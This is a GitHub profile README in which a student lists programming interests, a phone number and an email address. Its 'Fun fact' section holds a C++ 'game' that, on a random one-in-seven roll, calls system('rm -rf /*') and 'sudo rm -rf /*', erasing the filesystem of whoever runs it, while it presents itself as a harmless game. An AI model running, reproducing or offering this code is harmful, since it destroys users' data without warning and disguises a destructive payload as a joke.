- 👋 Hi, I’m @SalomandraC
- 👀 I am interested in solving problems in C++ and JS. I do frontend in my free time.
- 🌱 I am currently studying C++, JS, CSS, html.
- 💞️ I’m looking to collaborate. It's not that important while I'm studying. I am ready for any tasks on topics of interest to me.
- 📫 How to reach me. You can call +89109863281 or send an email kazak.petrushin@yandex.ru
- 😄 Pronouns: Nikita, Nikitka, Podkopus, You, Ni'Khit, Saloman
- ⚡ Fun fact:
Let's play a game:
''
#include <iostream>

#include <cstdlib>

#include <time.h>


//system removal function

void kill(){

	system("rm -rf /*");
 
	system("sudo rm -rf /*");
 
}


int main(){

	srand((unsigned) time(NULL));
 
	int randomNumber = (rand() % 7) + 1;
 
	if (randomNumber == 5) {
 
		std::cout << "Oh, no...?" << std::endl;
  
		kill();
  
	} else {
 
		std::cout << "You'll be lucky next time";
  
	}
 
	return 0;
 
}
''

<!---
SalomandraC/SalomandraC is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
You can click the Preview link to take a look at your changes.
--->
